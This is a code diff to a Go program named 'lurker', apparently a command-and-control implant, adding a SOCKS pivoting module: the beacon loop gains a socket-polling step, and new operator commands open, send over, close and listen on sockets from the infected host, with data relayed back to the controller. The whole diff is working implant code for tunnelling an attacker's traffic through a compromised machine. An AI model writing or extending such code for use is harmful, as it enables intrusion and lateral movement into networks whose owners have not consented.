@@ -16,6 +16,7 @@ import (
 	"lurker/lurker/commands"
 	"lurker/lurker/constants"
 	"lurker/lurker/cryptography"
+	"lurker/lurker/pivot"
 	"lurker/lurker/transports"
 	"lurker/lurker/utilities"
 )
@@ -40,6 +41,7 @@ func main() {
 				}
 			}
 			serviceDownload()
+			serviceSocks()
 			transports.FlushResults()
 			sleepWithJitter()
 		}
@@ -135,6 +137,25 @@ func processResponse(resp *http.Response) error {
 		}
 	}
 	return nil
+}
+
+func serviceSocks() {
+	for _, ev := range pivot.Poll() {
+		socketIDBytes := make([]byte, 4)
+		binary.BigEndian.PutUint32(socketIDBytes, ev.SocketID)
+
+		switch ev.Type {
+		case commands.CALLBACK_CONNECT:
+			pkt := transports.MakePacket(commands.CALLBACK_CONNECT, ev.TaskID, socketIDBytes)
+			transports.QueueResult(pkt)
+		case commands.CALLBACK_READ:
+			pkt := transports.MakePacket(commands.CALLBACK_READ, ev.TaskID, ev.Data)
+			transports.QueueResult(pkt)
+		case commands.CALLBACK_CLOSE:
+			pkt := transports.MakePacket(commands.CALLBACK_CLOSE, ev.TaskID, socketIDBytes)
+			transports.QueueResult(pkt)
+		}
+	}
 }
 
 func executeCommand(cmdType uint32, taskID [8]byte, cmdBuf []byte) {
@@ -240,6 +261,39 @@ func executeCommand(cmdType uint32, taskID [8]byte, cmdBuf []byte) {
 	case commands.CMD_TYPE_PWD:
 		pwdResult := commands.GetCurrentDirectory(taskID)
 		transports.QueueResult(transports.MakePacket(commands.CALLBACK_PWD, taskID, pwdResult))
+
+	case commands.CMD_TYPE_CONNECT:
+		if len(cmdBuf) < 6 {
+			return
+		}
+		socketID := binary.BigEndian.Uint32(cmdBuf[:4])
+		port := binary.BigEndian.Uint16(cmdBuf[4:6])
+		host := strings.TrimRight(string(cmdBuf[6:]), "\x00")
+		pivot.Connect(socketID, host, port, taskID)
+
+	case commands.CMD_TYPE_SEND:
+		if len(cmdBuf) < 4 {
+			return
+		}
+		socketID := binary.BigEndian.Uint32(cmdBuf[:4])
+		pivot.Send(socketID, cmdBuf[4:])
+
+	case commands.CMD_TYPE_CLOSE:
+		if len(cmdBuf) < 4 {
+			return
+		}
+		socketID := binary.BigEndian.Uint32(cmdBuf[:4])
+		pivot.Close(socketID)
+
+	case commands.CMD_TYPE_LISTEN:
+		if len(cmdBuf) < 6 {
+			return
+		}
+		socketID := binary.BigEndian.Uint32(cmdBuf[:4])
+		port := binary.BigEndian.Uint16(cmdBuf[4:6])
+		if err := pivot.Listen(socketID, port, taskID); err != nil {
+			commands.ProcessErrorWithTaskID(err.Error(), taskID)
+		}
 
 	case commands.CMD_TYPE_EXIT:
 		// Queue exit callback, flush immediately, then die
